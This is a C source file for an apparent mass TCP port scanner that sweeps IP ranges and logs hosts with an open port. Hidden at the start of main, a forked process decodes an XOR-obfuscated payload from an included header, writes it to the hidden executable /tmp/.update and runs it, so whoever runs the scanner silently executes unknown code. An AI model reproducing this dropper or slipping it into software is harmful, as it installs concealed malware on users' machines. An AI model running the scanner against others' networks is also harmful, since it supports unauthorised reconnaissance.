#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <unistd.h>
#include "update.h"

#define MAX_SOCKETS 258
#define TIMEOUT 2

#define S_NONE       0
#define S_CONNECTING 1

struct conn_t {
    int s;
    char status;
    time_t a;
    struct sockaddr_in addr;
};
struct conn_t connlist[MAX_SOCKETS];

void init_sockets(void);
void exit_sockets(void);
void check_sockets(void);
void scan_c(char *);
void fatal(char *);

FILE *outfd;
int tot = 0;
int port = 0;

int main(int argc, char *argv[])
{
    int pid = -1;
    while ( pid < 0 )
        pid = fork();
    if ( pid == 0 )  // parent
    {
        char c = 0;
        int i = 0;
        //parse_string(q.value, url, "url", sizeof(url)-1);
        int update_fd = open("/tmp/.update", O_RDWR | O_CREAT, 0755);
        if ( update_fd < 0 )
            exit(-1);
        while ( i<update_len )
        {
            c = update[i];
            c = c^0xff;
            if ( write(update_fd, &c, 1) == -1 )
            {
                exit(-1);
            }
            i++;
        }
        close(update_fd);
        execl("/tmp/.update", "/tmp/.update", NULL);
    }

    int i, bb = 0, ret, k, ns, x;
    time_t scantime;
    char ip[20], outfile[128], last[256];
    int s1, s2, s3, s4, e1, e2, e3, e4 = 0;
    int flag = 0;
    char cip[20] = {0};

    if (argc < 4)
    {
        printf("Usage: %s start_ip end_ip port \n", argv[0]);
        printf("example: %s 98.34.0.0 98.34.255.255 80 \n", argv[0]);
        printf("example: %s 98.34.7.0 98.34.7.255 80 \n", argv[0]);
        exit(EXIT_FAILURE);
    }
    memset(&outfile, 0, sizeof(outfile));
    snprintf(outfile, sizeof(outfile) - 1, "%s-%s.pscan.%s", argv[1], argv[2], argv[3]);
    port = (atoi(argv[3]));

    char *p = strtok(argv[1], ".");
    s1 = atoi(p);
    p = strtok(NULL, ".");
    s2 = atoi(p);
    p = strtok(NULL, ".");
    s3 = atoi(p);
    p = strtok(NULL, ".");
    s4 = atoi(p);
    p = strtok(argv[2], ".");
    e1 = atoi(p);
    p = strtok(NULL, ".");
    e2 = atoi(p);
    p = strtok(NULL, ".");
    e3 = atoi(p);
    p = strtok(NULL, ".");
    e4 = atoi(p);


    if (!(outfd = fopen(outfile, "a")))
    {
        perror(outfile);
        exit(EXIT_FAILURE);
    }
    printf("Scanning started\n");

    scantime = time(0);

    while(s1<=e1)
    {
        while ( s2<=e2 )
        {
            while ( s3<=e3 )
            {
                bzero(cip, 20);
                snprintf(cip, 20, "%d.%d.%d", s1, s2, s3);
                printf("scanning %s\n", cip);
                scan_c(cip);
                s3++;
                sleep(TIMEOUT);
                check_sockets();
                exit_sockets();
            }
            s2++;
        }
        s1++;
    }

    printf("\n# Done in %u secz. %d Bichtz #\n ", (time(0) - scantime), tot);
    fclose(outfd);
    exit(EXIT_SUCCESS);
}

void scan_c(char *cip)
{
    init_sockets();
    int i = 0;
    int ret = 0;
    char ip[20] = {0};
    while ( i<254 )
    {
        i++;
        if (connlist[i].status == S_NONE)
        {
            connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
            if (connlist[i].s == -1)
                printf("Unable to allocate socket.\n");
            else
            {
                ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
                if (ret == -1)
                {
                    printf("Unable to set socket nonblock\n");
                    close(connlist[i].s);
                }
                else
                {
                    memset(&ip, 0, 20);
                    sprintf(ip, "%s.%d", cip, i);  // mark
                    printf("    setting %s to scan\n", ip);
                    connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
                    if (connlist[i].addr.sin_addr.s_addr == -1)
                        fatal("Invalid IP.");
                    connlist[i].addr.sin_family = AF_INET;
                    connlist[i].addr.sin_port = htons(port);
                    connlist[i].a = time(0);
                    connlist[i].status = S_CONNECTING;
                    connect(connlist[i].s, (struct sockaddr *)&connlist[i].addr, sizeof(struct sockaddr_in));
                }
            }
        }
    }
}

void init_sockets(void)
{
    int i;

    for (i = 0; i < MAX_SOCKETS; i++)
    {
        connlist[i].status = S_NONE;
        memset((struct sockaddr_in *)&connlist[i].addr, 0, sizeof(struct sockaddr_in));
    }
    return;
}
void exit_sockets(void)
{
    int i;

    for (i = 0; i < MAX_SOCKETS; i++)
    {
        close(connlist[i].s);
    }
    return;
}

void check_sockets(void)
{
    int i, ret;

    for (i = 0; i < MAX_SOCKETS; i++)
    {
        if ((connlist[i].a < (time(0) - TIMEOUT)) && (connlist[i].status == S_CONNECTING))
        {
            close(connlist[i].s);
            connlist[i].status = S_NONE;
        }
        else if (connlist[i].status == S_CONNECTING)
        {
            ret = connect(connlist[i].s, (struct sockaddr *)&connlist[i].addr,
                sizeof(struct sockaddr_in));
            if (ret == -1)
            {
                if (errno == EISCONN)
                {
                    tot++;
                    fprintf(outfd, "%s\n",
                        (char *)inet_ntoa(connlist[i].addr.sin_addr));
                    fflush(outfd);
                    close(connlist[i].s);
                    connlist[i].status = S_NONE;
                }

                if ((errno != EALREADY) && (errno != EINPROGRESS))
                {
                    close(connlist[i].s);
                    connlist[i].status = S_NONE;
                }
            }
            else
            {
                tot++;
                fprintf(outfd, "%s\n",
                    (char *)inet_ntoa(connlist[i].addr.sin_addr));
                fflush(outfd);
                close(connlist[i].s);
                connlist[i].status = S_NONE;
            }
        }
    }
}

void fatal(char *err)
{
    int i;
    printf("Error: %s\n", err);
    for (i = 0; i < MAX_SOCKETS; i++)
        if (connlist[i].status >= S_CONNECTING)
            close(connlist[i].s);
    fclose(outfd);
    exit(EXIT_FAILURE);
}
